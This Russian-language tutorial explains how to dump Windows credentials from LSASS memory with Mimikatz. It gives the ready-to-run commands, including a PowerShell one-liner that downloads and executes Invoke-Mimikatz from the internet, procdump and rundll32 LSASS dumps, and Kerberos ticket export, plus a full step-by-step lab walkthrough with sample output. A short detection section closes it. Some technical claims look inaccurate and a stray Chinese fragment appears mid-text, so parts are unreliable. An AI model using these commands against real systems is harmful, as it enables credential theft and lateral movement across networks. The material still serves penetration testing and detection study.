# Mimikatz: Извлечение учётных данных из памяти LSASS

## Контекст и базовые понятия

LSASS (Local Security Authority Subsystem Service) является критически важным системным процессом в операционных системах семейства Windows, отвечающим за enforcement security policy, верификацию пользователей при входе в систему, обработку смены паролей и создание access tokens. В процессе своей работы LSASS накапливает в своей виртуальной памяти обширный набор аутентификационных материалов: NTLM-хэши, LM-хэши (в устаревших конфигурациях), Kerberos TGT (Ticket Granting Ticket) и, при определённых условиях, пароли в открытом виде. Именно эта архитектура хранения чувствительных данных в оперативной памяти делает LSASS главной целью для техники MITRE ATT&CK T1003.001 (OS Credential Dumping: LSASS Memory).

Mimikatz, разработанный Benjamin Delpy (известным в сообществе как gentilkiwi), представляет собой утилиту пост-эксплуатации, изначально созданную для демонстрации уязвимостей в механизмах аутентификации Windows. Инструмент позволяет извлекать учётные данные из памяти LSASS, манипулировать Kerberos-билетами, создавать Golden Tickets и выполнять атаки DCSync. В контексте тестирования на проникновение Mimikatz служит эталонным инструментом для оценки эффективности средств защиты конечных точек (EDR/AV) и настройки детектирования несанкционированного доступа к памяти системных процессов.

Ключевое разграничение необходимо провести между самими механизмами извлечения данных и инструментами их реализации. Техника T1003.001 описывает *что* происходит (чтение памяти LSASS), в то время как Mimikatz, Procdump, rundll32 и другие утилиты описывают *как* это реализуется. Понимание этого различия критично для аналитиков SOC: детекция должна строиться на поведении (чтение памяти lsass.exe), а не только на имени процесса.

| Сущность | Роль в извлечении учётных данных | Уровень доступа | Типичное применение в пентесте |
|---|---|---|---|
| **LSASS Process** | Хранитель аутентификационных материалов (хэши, билеты, ключи шифрования). | SYSTEM | Цель атаки (target). |
| **Mimikatz** | Пользовательский интерфейс для парсинга структур памяти LSASS и расшифровки данных. | Администратор / SYSTEM | Извлечение данных, манипуляция билетами. |
| **Procdump** | Утилита Sysinternals для создания дампа памяти процесса. | Администратор / SYSTEM | Создание файла дампа для офлайн-анализа. |
| **rundll32.exe** | Легитимный процесс Windows, способный вызывать функции `MiniDumpWriteDump` из `comsvcs.dll`. | Администратор / SYSTEM | "Living off the Land" (LotL) для создания дампа. |
| **Invoke-Mimikatz** | PowerShell-модуль, инкапсулирующий функционал Mimikatz без необходимости загрузки бинарного файла. | Администратор / SYSTEM | Бесфайловая эксплуатация (fileless). |

Путаница часто возникает между техникой T1003.001 (LSASS Memory) и T1003.002 (SAM). T1003.001 направлена на *активные* сессии в оперативной памяти, что позволяет получить пароли в открытом виде или действующие Kerberos-билеты. T1003.002 направлена на базу данных SAM на диске, что позволяет получить только NTLM-хэши локальных пользователей, но не требует наличия активной сессии пользователя в данный момент. Mimikatz поддерживает обе техники, но в контексте пост-эксплуатации домена приоритет отдаётся T1003.001 из-за возможности получения доменных учётных данных.

## Внутреннее устройство предмета

Механизм извлечения учётных данных через Mimikatz базируется на нескольких фундаментальных компонентах Windows, которые инструмент использует для обхода защитных механизмов. Понимание внутренней архитектуры LSASS и связанных с ней модулей необходимо для осознания того, почему Mimikatz работает и как его можно детектировать.

### Архитектура LSASS и Security Support Providers (SSP)

LSASS загружает модули Security Support Provider (SSP) при запуске системы. Эти DLL-библиотеки обрабатывают различные протоколы аутентификации. Ключевыми SSP являются:
*   **MSV (Microsoft Security Package):** Обрабатывает NTLM-аутентификацию. Хранит NT-хэши и, в некоторых конфигурациях, пароли в памяти.
*   **WDigest:** Обрабатывает Digest Authentication. Исторически хранил пароли в открытом виде в памяти. Начиная с Windows 8.1/Server 2012 R2, по умолчанию отключено, но может быть включено через реестр (`UseLogonCredential`).
*   **Kerberos:** Основной протокол для доменов Active Directory. Хранит TGT и service tickets.
*   **CredSSP:** Используется для Remote Desktop Services и Network Level Authentication.

Mimikatz использует модуль `sekurlsa` для взаимодействия с этими SSP. Модуль сканирует память LSASS в поисках структур данных, связанных с каждым SSP, и пытается извлечь ключи шифрования, необходимые для расшифровки сохранённых учётных данных.

### Модуль sekurlsa и структуры памяти

Модуль `sekurlsa` является ядром функционала Mimikatz по извлечечению данных. Он не просто читает память "в лоб", а ищет специфические структуры данных, такие как `SECURITY_LOGON_SESSION_DATA` и внутренние структуры SSP.

Для Kerberos-билетов Mimikatz ищет структуру `KerberosTicket`. Билеты шифруются сессионным ключом, который, в свою очередь, защищён ключом пользователя (или krbtgt для TGT). Mimikatz извлекает эти ключи из памяти, что позволяет ему расшифровать билеты и даже сгенерировать новые (Golden/Silver Tickets).

Для NTLM-хэшей и паролей в открытом виде (если они сохранены) Mimikatz использует функции копирования памяти, такие как `RtlCopyMemory` (экспортируемая из `ntdll.dll`), для безопасного извлечения данных из защищённых областей памяти LSASS.

### Обход защиты: PPL и Credential Guard

В современных версиях Windows (Windows 10/11, Server 2016+) защита LSASS усилена за счёт:
1.  **Protected Process Light (PPL):** Процесс LSASS запускается с флагом PPL, что запрещает обычным процессам с высоким привилегиями (даже SYSTEM) читать его память напрямую.
2.  **Credential Guard:** Использует виртуализацию для изоляции учётных данных в защищённый сегмент памяти (HVCI), недоступный для пользовательского режима.

Mimikatz обходит PPL, используя технику **Process Hollowing** или **Thread Injection** в легитимные процессы, которые имеют доступ к LSASS, либо используя уязвимости ядра. Однако, если Credential Guard включён, прямое извлечение паролей из памяти становится невозможным без эксплуатации уязвимостей ядра (kernel exploit), так как ключи шифрования находятся в изолированном пространстве.

### Сравнительная таблица методов доступа к памяти LSASS

| Метод доступа | Инструмент/Механизм | Принцип работы | Ограничения |
|---|---|---|---|
| **Прямое чтение памяти** | Mimikatz (`sekurlsa::logonpasswords`) | Открытие хендла к процессу LSASS с правами `PROCESS_ALL_ACCESS`. | Требует отключения PPL или наличия уязвимости ядра. |
| **Создание дампа (Dump)** | Procdump, rundll32, Task Manager | Вызов API `MiniDumpWriteDump` для сохранения состояния памяти в файл. | Работает даже с PPL, если процесс-дампер имеет права `SeDebugPrivilege` и обходит PPL. |
| **Инъекция DLL (SSP)** | Malicious DLL + Registry Key | Загрузка вредоносной DLL в адресное пространство LSASS через `AddSecurityPackage`. | Требует перезагрузки или вызова API. Работает до включения PPL. |
| **PowerShell-инъекция** | Invoke-Mimikatz | Загрузка кода Mimikatz в память PowerShell, который затем обращается к LSASS. | Зависит от версии PowerShell и политик Execution Policy. |

## Применение и работа с предметом

На практике специалист по тестированию на проникновение или аналитик SOC сталкивается с необходимостью либо использовать Mimikatz для извлечения данных, либо детектировать его использование. Рассмотрим типичные операции и паттерны.

### Работа с интерактивной консолью Mimikatz

Mimikatz не имеет аргументов командной строки для выполнения основных операций; управление осуществляется через интерактивный интерфейс.

1.  **Запуск и получение привилегий:**
    Перед извлечением данных необходимо активировать привилегию `SeDebugPrivilege`, которая позволяет процессу отлаживать и читать память других процессов, включая системные.
    ```powershell
    mimikatz # privilege::debug
    Privilege '20' OK
    ```
    Без этой команды попытка чтения памяти LSASS завершится ошибкой доступа.

2.  **Извлечение данных из живой памяти:**
    Команда `sekurlsa::logonPasswords` (или сокращённо `logonpasswords`) сканирует память LSASS и выводит найденные учётные данные.
    ```powershell
    mimikatz # sekurlsa::logonPasswords full
    .
    0 : 541043
    .   User : Administrator
    .   Domain : WORKGROUP
    .   LM     : aad3b435b51404eeaad3b435b51404ee
    .   NTLM   : 8846f7eaee8fb117ad06bdd830b7586c
    .   SHA1   : 14d02100a016405d8b6c1c8503f9706dbb4ee72e
    .   Password : (null)
    .
    ```
    *Примечание:* Поле `Password` будет заполнено только если WDigest включён или если используется специфическая версия Mimikatz, поддерживающая извлечение паролей из других SSP (например, через инъекцию).

3.  **Работа с Kerberos-билетами:**
    Для получения билетов используется команда `sekurlsa::tickets /export`. Это позволяет сохранить билеты в формате `.kirbi` для последующего использования в инструментах типа Rubeus или Impacket.
    ```powershell
    mimikatz # kerberos::list /export
    ```

### Бесфайловая эксплуатация через PowerShell

В средах, где бинарные файлы Mimikatz блокируются антивирусами, используется модуль `Invoke-Mimikatz`. Он загружает код Mimikatz в память PowerShell, избегая записи на диск.

```powershell
# Загрузка модуля из интернета (IEX - Invoke-Expression)
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

# Выполнение команды извлечения
Invoke-Mimikatz -DumpCreds
```
Этот метод часто детектируется по аномальной активности PowerShell (например, использование `DownloadString` и `IEX`).

### Создание дампа памяти для офлайн-анализа

Если прямое чтение заблокировано PPL, специалист создаёт дамп процесса LSASS на целевой машине, а затем анализирует его локально.

1.  **Создание дампа:**
    ```powershell
    # Использование Procdump
    procdump.exe -ma lsass.exe lsass.dmp
    
    # Или через rundll32 (LotL)
    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID_lsass> lsass.dmp full
    ```
2.  **Анализ дампа:**
    Перенос файла `lsass.dmp` на рабочую станцию аналитика и выполнение:
    ```powershell
    mimikatz # sekurlsa::minidump lsass.dmp
    Switch to MINIDUMP : 'lsass.dmp'
    
    mimikatz # sekurlsa::logonPasswords
    ```

### Типичные ошибки и подводные камни

*   **Архитектура x86 vs x64:** Mimikatz должен соответствовать архитектуре целевой системы. 32-битная версия не может напрямую читать память 64-битного процесса LSASS. Однако она может читать дампы.
*   **Credential Guard:** Если включён Credential Guard, извлечение паролей в открытом виде из дампа LSASS невозможно, так как ключи шифрования отсутствуют в стандартных структурах памяти.
*   **WDigest отключён:** В современных системах WDigest отключён по умолчанию. Ожидание нахождения пароля в открытом виде в поле `Password` без специальной конфигурации или инъекции DLL будет ошибкой.

## Сквозной практический пример: Извлечение учётных данных в изолированной среде

**Исходные условия:**
*   **Среда:** Виртуальная машина с Windows 10 Pro (x64), отключённым Defender (для демонстрации функционала), без включённого Credential Guard.
*   **Роль:** Пентестер, имеющий доступ к командной строке с правами локального администратора.
*   **Цель:** Извлечение NTLM-хэша и пароля в открытом виде (если доступно) для пользователя `testuser`.
*   **Инструменты:** Mimikatz (последняя версия), PowerShell.

### Шаг 1: Активация привилегий отладки

Перед обращением к памяти LSASS необходимо убедиться, что процесс Mimikatz имеет право на отладку других процессов.

```powershell
# Запуск Mimikatz
.\mimikatz.exe

# В интерактивной консоли Mimikatz:
mimikatz # privilege::debug
Privilege '20' OK
```
*Ожидаемый вывод:* `Privilege '20' OK`. Это подтверждает, что процесс получил право `SeDebugPrivilege`.

### Шаг 2: Извлечение данных из живой памяти

Попытка извлечения учётных данных напрямую из памяти.

```powershell
mimikatz # sekurlsa::logonPasswords full
```
*Ожидаемый вывод (фрагмент):*
```text
 .   User : testuser
 .   Domain : DESKTOP-ABC123
 .   LM     : aad3b435b51404eeaad3b435b51404ee
 .   NTLM   : 5f4dcc3b5aa765d61d8327deb882cf99
 .   SHA1   : aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
 .   Password : Password123!
```
*Анализ:* Если WDigest был включён или используется старая версия Windows, пароль появится в открытом виде. В современных системах поле `Password` может быть пустым, но NTLM-хэш будет доступен.

### Шаг 3: Создание дампа памяти (обход PPL)

Если прямое чтение не сработало из-за PPL, создаём дамп.

```powershell
# В PowerShell на целевой машине:
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```
*Ожидаемый вывод:*
```text
ProcDump v10.0 - Process dump utility
Copyright (c) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

Process:       lsass.exe (1234)
...
Dump 1 started:
Dump 1 complete:
Dump 1 written to C:\temp\lsass.dmp
```

### Шаг 4: Офлайн-анализ дампа

Перенос `lsass.dmp` на машину аналитика и анализ.

```powershell
# В интерактивной консоли Mimikatz на машине аналитика:
mimikatz # sekurlsa::minidump C:\temp\lsass.dmp
Switch to MINIDUMP : 'C:\temp\lsass.dmp'

mimikatz # sekurlsa::logonPasswords
```
*Ожидаемый вывод:* Аналогичен шагу 2, но данные извлекаются из файла, а не из живой памяти. Это позволяет обойти некоторые实时监控ные защиты, если дамп создан до их активации.

### Шаг 5: Экспорт Kerberos-билетов

Для последующего перемещения по сети.

```powershell
mimikatz # kerberos::list /export
```
*Ожидаемый вывод:*
```text
Ticket exported to C:\temp\TGT_testuser@DES...
```
*Анализ:* Билет сохранён в формате `.kirbi`, готовый для использования в других инструментах.

**Ожидаемый вывод примера:**
Пример демонстрирует полный цикл извлечения учётных данных: от активации привилегий до получения NTLM-хэша и Kerberos-билета. В среде без Credential Guard это позволяет получить полные учётные данные пользователя. В среде с Credential Guard шаги 2 и 4 вернут только хэши или не вернут пароли в открытом виде, что указывает на необходимость других методов атаки.

## Аналитический вывод

Извлечение учётных данных из памяти LSASS с помощью Mimikatz остаётся одним из наиболее эффективных методов пост-эксплуатации в инфраструктурах Windows. Ключевая уязвимость заключается в архитектуре Windows, где аутентификационные материалы хранятся в открытом виде или с использованием ключей, доступных в памяти процесса LSASS. Mimikatz, благодаря своей модульной структуре и глубокому пониманию внутренних структур Windows, позволяет не только извлекать NTLM-хэши, но и получать пароли в открытом виде (при включённых SSP) и манипулировать Kerberos-билетами.

Для специалистов по безопасности критически важно понимать, что защита от Mimikatz не сводится к блокировке одного бинарного файла. Необходимо внедрять многоуровневую защиту: отключение WDigest, использование Credential Guard для изоляции ключей, мониторинг создания дампов памяти LSASS (через Sysmon Event ID 10 с анализом `CallTrace`) и ограничение прав `SeDebugPrivilege`. Детектирование должно фокусироваться на поведении (чтение памяти lsass.exe, загрузка подозрительных DLL в LSASS), а не только на индикаторах компрометации (IoC) самого инструмента.

## Источники

*   [Mimikatz | Red Canary Threat Detection Report](https://redcanary.com/threat-detection-report/threats/mimikatz/)
*   [OS Credential Dumping: LSASS Memory (T1003.001) | MITRE ATT&CK](https://attack.mitre.org/techniques/T1003/001/)
*   [Mimikatz | Hackviser](https://hackviser.com/tactics/tools/mimikatz)
*   [mimikatz — Инструменты Kali Linux](https://kali.tools/?p=5342)
*   [LSASS Memory - Red Canary Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/lsass-memory/)
*   [LSASS Memory Dumps: Dumping Methods Explained [Part 1] | Deep Instinct](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before)
*   [You Bet Your Lsass: Hunting LSASS Access | Splunk](https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html)
*   [Exploring Mimikatz - Part 1 - WDigest - XPN InfoSec Blog](https://blog.xpnsec.com/exploring-mimikatz-part-1/)
*   [Mimikatz Comprehensive Guide - HADESS](https://hadess.io/mimikatz-comprehensive-guide/)
*   [Извлекаем пароли/хэши пользователей Windows с помощью Mimikatz | Windows для системных администраторов](https://winitpro.ru/index.php/2013/12/24/poluchenie-v-otkrytom-vide-parolej-polzovatelej-avtorizovanyx-v-windows/)
*   [Dumping Credentials from Lsass Process Memory with Mimikatz | Red Team Notes](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-credentials-from-lsass.exe-process-memory)